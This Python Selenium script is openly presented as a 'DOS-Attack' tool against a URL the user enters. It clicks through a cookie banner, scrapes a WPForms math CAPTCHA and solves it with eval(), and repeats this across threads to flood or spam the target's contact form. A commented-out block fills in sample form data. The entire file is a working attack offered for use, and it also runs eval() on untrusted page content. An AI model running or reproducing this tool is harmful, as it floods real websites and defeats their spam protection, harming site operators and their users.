from time import sleep
import time
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import Select
import threading

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

url = input("URL to attack <http(s)://{url}/{dir}>: ")

#Spam-Protection-Bypass and Cookie Agreement
def send_request(times_per_thread):
    for i in range(times_per_thread):
        try:
            driver = webdriver.Firefox()
            driver.get(url)
            driver.find_element(by=By.CSS_SELECTOR, value="#CookieBoxSaveButton").click() #modify this
            driver.implicitly_wait(2)
            source_text = driver.execute_script("return document.getElementById('wpforms-1844-field_18-container').outerHTML") #modify 'wpforms-1844-field_18-container'
            source_text = str(source_text)
            s1 = source_text.split('<span class="n1">')[1]
            first_value = s1.split('</span>')[0]
            s3 = s1.split('<span class="cal">')[1]
            math_operator = s3.split('</span>')[0]
            s5 = s3.split('<span class="n2">')[1]
            second_value = s5.split('</span>')[0]
            task = "{}{}{}".format(first_value, math_operator, second_value)
            result = eval(task)
            print(f"{bcolors.OKGREEN}[+] Bypassed Spam-Protection: {task}={result}")

        except Exception as e:
            print(f"{bcolors.FAIL}[+] Problem occurred: {e}")
            exit()

        sleep(1.5)

        #Crazy_Data_Fill Example (Fill out formular)
        '''
        select = Select(driver.find_element(by=By.NAME, value='wpforms[fields][1]'))
        select.select_by_visible_text("Herr"
        select = driver.find_element(by=By.NAME, value='wpforms[fields][3][first]')
        select.send_keys("Dieter")
        select = driver.find_element(by=By.NAME, value='wpforms[fields][3][last]')
        select.send_keys("Bert")'''

        sleep(3)
        driver.quit()

def execution_loop(threads, times_per_thread):
    for i in range(threads):
        x = threading.Thread(target=send_request, args=(times_per_thread, ))
        x.start()
        x.join()

threads = int(input("Anzahl Threads: "))
times_per_thread = int(input("DOS-Times per Thread: "))

if threads <= 0 or times_per_thread <= 0:
    print(f"{bcolors.FAIL}[!] Threads or Times per Threads must be >= 1.")
    exit()

print(f"{bcolors.OKCYAN}[+] Starting DOS-Attack on URL {url}.")
start = time.time()
execution_loop(threads=threads, times_per_thread=times_per_thread)
end = time.time()
print("{}[+] Successfully finished DOS-Attack on URL {}.\nTime needed:{} {}s".format(bcolors.OKCYAN, url, end-start, bcolors.BOLD))